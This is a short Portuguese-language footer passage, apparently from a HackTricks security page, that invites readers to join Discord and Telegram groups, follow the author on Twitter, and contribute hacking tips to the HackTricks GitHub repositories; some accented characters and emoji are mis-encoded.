* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
